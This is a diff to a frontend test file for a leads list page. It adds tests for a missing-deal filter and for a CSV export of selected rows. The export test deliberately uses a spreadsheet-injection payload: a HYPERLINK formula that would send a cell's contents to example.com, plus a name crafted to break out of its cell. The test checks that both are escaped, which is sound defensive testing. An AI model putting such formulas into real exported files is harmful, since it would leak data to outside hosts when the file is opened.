@@ -3,7 +3,8 @@
  * headers, paging, page size, quick filters, chips, the organization-wide cards and the columns.
  * The router's URL really changes; the list hook records what it was asked for.
  * Also the latest hearing's columns, filters and presets (#137) and the server export (#173),
- * the empty and failed list and the names of the row selection (#431).
+ * the empty and failed list and the names of the row selection (#431), and the CSV of the rows
+ * chosen, written in the browser with each cell safe for a spreadsheet (#996).
  */
 import LeadsPage from '@/app/[locale]/(dashboard)/leads/page';
 import { LEAD_LIST_PREFERENCES_KEY } from '@/hooks/use-lead-list-query';
@@ -57,6 +58,8 @@ const server = vi.hoisted(() => ({
   failed: false,
   refetch: vi.fn(),
   access: { canCreate: true, canEdit: false, canDelete: false },
+  /** missingDeal of leads.statusCounts (#854): null for those who may not read deals */
+  missingDeal: undefined as number | null | undefined,
 }));
 
 const exporter = vi.hoisted(() => ({
@@ -135,6 +138,7 @@ vi.mock('@/hooks/use-leads', () => ({
     data: {
       total: 120,
       byStatus: { new: 40, nurturing: 30, negotiating: 20, won: 18, lost: 12 },
+      missingDeal: server.missingDeal,
     },
     refetch: vi.fn(),
   }),
@@ -158,6 +162,10 @@ vi.mock('@/lib/trpc/client', () => {
         export: {
           useMutation: () => ({ mutateAsync: exporter.mutateAsync, isPending: false }),
         },
+      },
+      // The create dialog mounts LeadForm, whose status field renders <FieldHelp> (Epic #780 P2)
+      fieldGlossary: {
+        getByKeys: { useQuery: () => ({ data: undefined, isLoading: false }) },
       },
     },
   };
@@ -198,6 +206,7 @@ beforeEach(() => {
   server.failed = false;
   server.refetch.mockClear();
   server.access = { canCreate: true, canEdit: false, canDelete: false };
+  server.missingDeal = undefined;
   exporter.mutateAsync.mockReset();
   for (const fn of Object.values(exporter.toast)) fn.mockClear();
 });
@@ -321,6 +330,90 @@ describe('LeadsPage list (server-driven)', () => {
     expect(within(cards[2]).getByText('15.0%')).toBeInTheDocument();
     // No average score card: the MQL level says how promising leads are (#447)
     expect(screen.queryByText('61')).not.toBeInTheDocument();
+  });
+
+  describe('leads missing a deal (#854)', () => {
+    const m = messages.leads.missingDeal;
+    const notice = /^商談が未作成のリード 4件/;
+
+    it('links the count under the cards to the filtered list', async () => {
+      server.missingDeal = 4;
+      const { unmount } = renderPage();
+      await table();
+      expect(screen.getByRole('link', { name: notice })).toHaveAttribute(
+        'href',
+        '/ja/leads?nodeal=1'
+      );
+      unmount();
+
+      // Withheld from those who may not read deals
+      server.missingDeal = null;
+      renderPage();
+      await table();
+      expect(screen.queryByText(/商談が未作成のリード/)).not.toBeInTheDocument();
+    });
+
+    it('filters the list from the URL, keeps the notice as text and has a chip that removes it', async () => {
+      const user = userEvent.setup();
+      server.missingDeal = 4;
+      renderPage('nodeal=1');
+      await table();
+      expect(lastInput()).toMatchObject({ missingDeal: true, offset: 0 });
+      // The list shows these leads already: the notice explains it, without the link
+      expect(screen.queryByRole('link', { name: notice })).not.toBeInTheDocument();
+      expect(screen.getByText('商談が未作成のリード 4件')).toBeInTheDocument();
+      expect(screen.queryByText(m.action)).not.toBeInTheDocument();
+
+      const chips = within(screen.getByRole('group', { name: t.chips.label }));
+      await user.click(chips.getByRole('button', { name: `条件「${t.missingDeal}」を外す` }));
+      await waitFor(() => expect(lastInput()?.missingDeal).toBeUndefined());
+      expect(nav.get()).toBe('');
+      expect(screen.getByRole('link', { name: notice })).toBeInTheDocument();
+    });
+
+    it('takes the filter off with a word why for those who may not read deals', async () => {
+      server.missingDeal = null;
+      renderPage('nodeal=1&status=won');
+      await waitFor(() => expect(nav.get()).toBe('status=won'));
+      // Replaced, so the back button does not return to the condition and take it off again
+      expect(nav.replace).toHaveBeenCalledWith('/ja/leads?status=won', { scroll: false });
+      expect(nav.push).not.toHaveBeenCalled();
+      expect(lastInput()).not.toHaveProperty('missingDeal');
+      expect(exporter.toast.info).toHaveBeenCalledWith(m.forbidden, {
+        id: 'missing-deal-forbidden',
+      });
+    });
+
+    it('keeps the filter while the count is loading', async () => {
+      server.missingDeal = undefined;
+      renderPage('nodeal=1');
+      await table();
+      expect(lastInput()).toMatchObject({ missingDeal: true });
+      expect(nav.get()).toBe('nodeal=1');
+      expect(exporter.toast.info).not.toHaveBeenCalled();
+    });
+
+    it('says none are left once they are all fixed, with a way to clear the filter', async () => {
+      const user = userEvent.setup();
+      server.items = [];
+      server.total = 0;
+      server.missingDeal = 0;
+      renderPage('nodeal=1');
+      expect(await screen.findByText(m.none)).toBeInTheDocument();
+      expect(screen.queryByText(t.noMatchesDescription)).not.toBeInTheDocument();
+      const cell = screen.getByText(m.none).closest('td') as HTMLElement;
+      await user.click(within(cell).getByRole('button', { name: t.chips.clearAll }));
+      expect(nav.get()).toBe('');
+    });
+
+    it('says nothing matches as usual when another filter is on too', async () => {
+      server.items = [];
+      server.total = 0;
+      server.missingDeal = 0;
+      renderPage('nodeal=1&status=won');
+      expect(await screen.findByText(t.noMatches)).toBeInTheDocument();
+      expect(screen.queryByText(m.none)).not.toBeInTheDocument();
+    });
   });
 
   it('shows the source translated', async () => {
@@ -583,5 +676,44 @@ describe('LeadsPage row selection names (#431)', () => {
       expect(screen.queryByRole('button', { name: '選択を解除' })).not.toBeInTheDocument()
     );
     expect(row()).not.toBeChecked();
+  });
+});
+
+describe('LeadsPage export of the rows chosen (#996)', () => {
+  /** The text of the file given to the link (jsdom's Blob has no text()) */
+  const readBlob = (blob: Blob) =>
+    new Promise<string>((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = () => resolve(String(reader.result));
+      reader.onerror = () => reject(reader.error);
+      reader.readAsText(blob);
+    });
+
+  it('writes a cell from a public form so that it neither runs as a formula nor makes cells of its own', async () => {
+    const user = userEvent.setup();
+    const createObjectURL = vi.fn((_blob: Blob) => 'blob:x');
+    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
+    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
+    server.items = [
+      makeLead('a1', {
+        name: '架空 太郎","=1+1',
+        company: '=HYPERLINK("https://example.com/?d="&C2,"詳細")',
+      }),
+    ];
+    renderPage();
+    const grid = within(await table());
+
+    await user.click(grid.getByRole('checkbox', { name: 'すべて選択' }));
+    await user.click(await screen.findByRole('button', { name: '選択をエクスポート' }));
+    await user.click(await screen.findByRole('menuitem', { name: 'CSV' }));
+
+    await waitFor(() => expect(click).toHaveBeenCalled());
+    const [header, row] = (await readBlob(createObjectURL.mock.calls[0][0])).split('\n');
+    expect(header).toBe('Name,Email,Company,Phone,Status,Score,Source,Created At');
+    // The quotes doubled inside quotes, the formula after a quote mark: 8 cells, as many as the header
+    expect(row).toBe(
+      `"架空 太郎"",""=1+1",a1@example.jp,"'=HYPERLINK(""https://example.com/?d=""&C2,""詳細"")",,new,70,diagnostic,2026-10-11T01:00:00.000Z`
+    );
+    click.mockRestore();
   });
 });
